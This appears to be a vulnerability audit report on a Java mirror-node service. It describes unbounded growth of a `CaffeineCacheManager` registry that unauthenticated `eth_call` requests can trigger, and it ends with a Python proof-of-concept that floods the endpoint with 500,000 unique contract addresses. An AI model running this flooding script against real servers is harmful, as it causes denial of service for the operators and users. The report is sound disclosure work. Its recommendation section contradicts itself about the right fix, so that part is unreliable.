Audit Report

## Title
Unbounded `CaffeineCacheManager` Registry Growth via Unauthenticated `eth_call` Requests Causes Memory Leak and GC Pressure

## Summary
`cacheManagerSlotsPerContract` is instantiated in dynamic mode (no `setCacheNames()` call), causing Spring's `CaffeineCacheManager` to permanently accumulate one `CaffeineCache` object per unique `contractId` ever passed to `findStorageBatch()`. The outer `contractSlotsCache` (bounded at 3,000 entries) does not prevent this growth — it only limits active entries, while the manager's internal registry retains all entries ever created. An unauthenticated attacker can exploit the public `eth_call` endpoint to drive unbounded heap growth.

## Finding Description

**`EvmConfiguration.java` lines 107–112** — `cacheManagerSlotsPerContract` is created without `setCacheNames()`, placing it in dynamic mode:

```java
@Bean(CACHE_MANAGER_SLOTS_PER_CONTRACT)
CaffeineCacheManager cacheManagerSlotsPerContract() {
    final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
    caffeineCacheManager.setCacheSpecification(cacheProperties.getSlotsPerContract());
    return caffeineCacheManager;   // no setCacheNames() → dynamic mode
}
``` [1](#0-0) 

Every other cache manager in the same file calls `setCacheNames(Set.of(...))` to pre-register a fixed set of names, preventing dynamic creation: [2](#0-1) [3](#0-2) 

**`ContractStateServiceImpl.java` lines 85–87** — on every cache miss for a new `contractId`, `getCache(contractId.toString())` is called on the dynamic manager:

```java
private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
    final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
            contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
``` [4](#0-3) 

**Root cause:** Spring's `CaffeineCacheManager` stores named caches in an internal `ConcurrentHashMap<String, Cache>`. When `getCache(name)` is called with a name not already in the map, a new `CaffeineCache` (backed by a full Caffeine cache structure) is created and inserted. There is no eviction path for this internal map.

**Failed assumption:** The designers assumed the outer `contractSlotsCache` (bounded at 3,000 entries per `CacheProperties.java` line 25) would cap total memory. It caps *active* entries, but `cacheManagerSlotsPerContract`'s internal registry is a separate, unbounded data structure that accumulates one entry per unique `contractId` ever seen. [5](#0-4) 

When `contractSlotsCache` evicts an entry for `contractId_X`, the corresponding `CaffeineCache` object remains permanently in `cacheManagerSlotsPerContract`'s internal map, referenced by the contract ID string. Each subsequent call for a new contract ID adds another permanent entry.

## Impact Explanation

- **Memory leak:** `cacheManagerSlotsPerContract`'s internal map grows without bound. Each entry is a full Caffeine cache object; even empty ones carry significant overhead (internal segment arrays, atomic references, timer wheel structures).
- **GC pressure:** The leaked objects are long-lived (never collected), promoting to the old generation and triggering expensive full GC cycles, directly degrading throughput and latency for all users.
- **Potential OOM:** With sustained attack traffic at the permitted 500 RPS (confirmed in configuration docs), an attacker can introduce hundreds of thousands of unique contract IDs within minutes, potentially exhausting heap.
- **No data exfiltration required:** Non-existent contract addresses produce empty DB results but still trigger the cache creation path. [6](#0-5) 

## Likelihood Explanation

- **No authentication required:** `eth_call` (`POST /api/v1/contracts/call`) is a public, unauthenticated JSON-RPC endpoint.
- **Rate limit is permissive:** Default `requestsPerSecond=500` allows 500 unique contract IDs per second = 1.8 million per hour.
- **Trivially scriptable:** A simple loop generating sequential or random EVM addresses and sending `eth_call` requests is sufficient.
- **Persistent effect:** Cache objects accumulate across the lifetime of the JVM process; the attacker does not need to maintain a connection.
- **No on-chain cost:** Unlike Hedera network transactions, `eth_call` is a simulation endpoint with no fee.

## Recommendation

Call `setCacheNames()` on `cacheManagerSlotsPerContract` to disable dynamic mode, consistent with every other cache manager in `EvmConfiguration.java`. Since the per-contract caches are created dynamically by design, the correct fix is to remove the `CaffeineCacheManager` registry entirely and manage the per-contract `CaffeineCache` objects directly within `ContractStateServiceImpl` — for example, by storing them as values in `contractSlotsCache` without going through a `CaffeineCacheManager` at all. This eliminates the unbounded registry while preserving the intended caching behavior. Alternatively, implement a removal listener on `contractSlotsCache` that calls `cacheManagerSlotsPerContract`'s internal map cleanup when an entry is evicted. [1](#0-0) 

## Proof of Concept

```python
import requests, itertools, threading

URL = "http://<mirror-node-host>/api/v1/contracts/call"

def make_address(n):
    return "0x" + hex(n)[2:].zfill(40)

def attack(start, count):
    for i in range(start, start + count):
        payload = {
            "data": "0x",
            "to": make_address(i),
            "gas": 30000
        }
        try:
            requests.post(URL, json=payload, timeout=5)
        except Exception:
            pass

# Launch 500 threads, each sending 1000 requests with unique contract addresses
threads = [threading.Thread(target=attack, args=(i*1000, 1000)) for i in range(500)]
for t in threads: t.start()
for t in threads: t.join()
# After 500,000 unique contract IDs:
# cacheManagerSlotsPerContract internal map holds 500,000 CaffeineCache objects
# contractSlotsCache holds at most 3,000 active entries
# ~500MB–2.5GB of leaked objects in old generation
```

Each unique `to` address causes `cacheManagerSlotsPerContract.getCache(contractId.toString())` to permanently insert a new `CaffeineCache` into the manager's internal `ConcurrentHashMap`. After `contractSlotsCache` fills past 3,000 entries and begins evicting, the registry continues growing unboundedly. [4](#0-3)
